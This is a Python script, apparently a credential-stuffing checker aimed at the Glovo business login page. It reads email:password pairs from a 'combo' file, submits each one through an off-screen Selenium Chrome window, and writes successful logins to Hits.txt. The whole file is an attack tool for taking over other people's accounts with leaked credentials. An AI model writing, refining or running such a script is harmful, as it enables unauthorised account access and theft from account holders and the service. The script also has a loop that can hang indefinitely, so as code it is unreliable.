import os
global combo_file
try:
    from selenium.webdriver.common.by import By
    from selenium import webdriver
    import speedtest
except ImportError:
    print("[+] Libs Not Found Installing Now ...")
    os.system("pip install selenium")
    os.system("pip install speedtest-cli")
    print("[+] Done Installing The Libs .")
    from selenium.webdriver.common.by import By
    from selenium import webdriver
    import speedtest
try:
    combo_file = open(input("Enter Combo Name : ").replace(".txt","")+".txt","r+",encoding="utf-8").read().splitlines()
except FileNotFoundError:
    print("[+] File Not Found Check The Name (:")
except:
    print("[+] Error When Opening The File (:")
Hits = 0
Bad = 0
speed_test = speedtest.Speedtest()
def bytes_to_mb(bytes):
  KB = 1024
  MB = KB * 1024
  return int(bytes/MB)
download_speed = bytes_to_mb(speed_test.download())
if download_speed <5:
    print("Your Download speed is", download_speed, "MB. You may encounter problems and slowness due to the weak internet ); .")
for account in combo_file:
    global Email,Password
    try:
        Email = account.split(":")[0]
        Password = account.split(":")[1]
        browser = webdriver.Chrome()
        browser.set_window_position(-10000,0)
        g = browser.get("https://business.glovoapp.com/login")
        username = browser.find_element("name","inner_email")
        password = browser.find_element("name","inner_password")
        submit   = browser.find_element("name","submit")
        username.send_keys(Email)
        password.send_keys(Password)
        h = submit.click()
        error_message = "Authentication failed: bad credentials"
        errors = browser.find_elements(By.CLASS_NAME, "error-message")
        while True:
            if errors[0].text != "":
                if errors[0].text != error_message:
                    print(f"[{Hits}] Login successful | {Email}:{Password}")
                    open("Hits.txt","a+",encoding="utf-8").write(f"{Email}:{Password}\n")
                    Hits += 1
                    break
                if errors[0].text == error_message:
                    print(f"[{Bad}] Login failed")
                    Bad += 1
                    break
        browser.close()
    except Exception as error:
        print(f"[+] Skip This Account ({Email}:{Password}) Bcz This Error > {error}")